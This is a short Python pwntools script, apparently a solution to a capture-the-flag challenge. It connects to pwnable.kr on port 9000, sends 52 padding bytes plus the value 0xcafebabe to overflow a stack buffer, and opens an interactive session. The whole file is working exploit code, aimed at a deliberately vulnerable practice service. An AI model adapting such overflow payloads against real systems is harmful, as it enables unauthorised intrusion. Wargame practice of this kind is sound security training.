#import socket
from pwn import *

pwn_socket=remote('pwnable.kr',9000)
pwn_socket.sendline('A' * 52 + '\xbe\xba\xfe\xca')
pwn_socket.interactive()


